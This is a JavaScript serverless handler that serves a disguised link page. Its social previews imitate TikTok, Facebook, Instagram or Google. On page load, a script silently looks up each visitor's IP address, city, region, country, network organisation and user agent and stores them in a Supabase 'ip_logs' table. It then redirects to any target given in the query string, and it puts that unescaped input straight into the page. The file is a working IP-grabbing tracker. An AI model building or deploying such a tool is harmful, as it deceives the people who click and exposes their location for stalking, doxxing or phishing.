export default function handler(req, res) {
    const { name, target } = req.query;

    const configs = {
        'TikTok': {
            title: 'TikTok - Make Your Day',
            desc: 'Watch trending content from your favorite creators on TikTok.',
            image: '/tiktok_preview.png',
            color: '#fe2c55',
            footer: 'TikTok Inc. 2024'
        },
        'Facebook': {
            title: 'Facebook - Log In or Sign Up',
            desc: 'Create an account or log into Facebook. Connect with friends, family and other people you know.',
            image: 'https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png',
            color: '#0866ff',
            footer: 'Meta © 2024'
        },
        'Instagram': {
            title: 'Instagram',
            desc: 'Watch the latest reels and photos from your favorite creators.',
            image: 'https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png',
            color: '#e4405f',
            footer: 'Meta © 2024'
        },
        'Google': {
            title: 'Google Search',
            desc: 'Search the world\'s information, including webpages, images, videos and more.',
            image: 'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_Refined_Icons_Search_Color.png/600px-Google_Refined_Icons_Search_Color.png',
            color: '#4285f4',
            footer: 'Google LLC 2024'
        }
    };

    const platform = name || 'TikTok';
    const cfg = configs[platform] || configs['TikTok'];
    const redirectTarget = target || 'https://www.google.com';

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${cfg.title}</title>
    
    <!-- Dynamic Social Previews (Open Graph) - Optimized for Vercel -->
    <meta property="og:type" content="website">
    <meta property="og:title" content="${cfg.title}">
    <meta property="og:description" content="${cfg.desc}">
    <meta property="og:image" content="${cfg.image}">
    <meta name="twitter:card" content="summary_large_image">

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="/supabase_config.js"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #121212;
            margin: 0;
            color: white;
        }
        .platform-logo {
            width: 80px; height: 80px; margin-bottom: 20px;
            filter: drop-shadow(2px 0px 0px ${cfg.color}) drop-shadow(-2px 0px 0px #25f4ee);
        }
        .loader {
            width: 48px; height: 48px; border: 3px solid #FFF;
            border-bottom-color: ${cfg.color}; border-radius: 50%;
            display: inline-block; animation: rotation 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .message { font-size: 16px; font-weight: 600; opacity: 0.8; }
        .footer { position: absolute; bottom: 30px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <svg class="platform-logo" viewBox="0 0 448 512" fill="white">
        <path d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,381,102.39a121.43,121.43,0,0,0,67,20.14Z"/>
    </svg>
    <span class="loader"></span>
    <p class="message">Redirecting to ${platform}...</p>
    <div class="footer">${cfg.footer}</div>

    <script>
        async function logAndRedirect() {
            const urlParams = new URLSearchParams(window.location.search);
            const target = urlParams.get('target') || '${redirectTarget}';
            
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                if (window.supabaseClient) {
                    await window.supabaseClient.from('ip_logs').insert([{
                        ip_address: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country_name,
                        org: data.org,
                        user_agent: navigator.userAgent,
                        target_url: target,
                        link_name: '${platform}'
                    }]);
                }
            } catch (err) {
                console.error('Logging failed:', err);
            } finally {
                setTimeout(() => { window.location.href = target; }, 2000);
            }
        }
        logAndRedirect();
    </script>
</body>
</html>`;

    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(html);
}
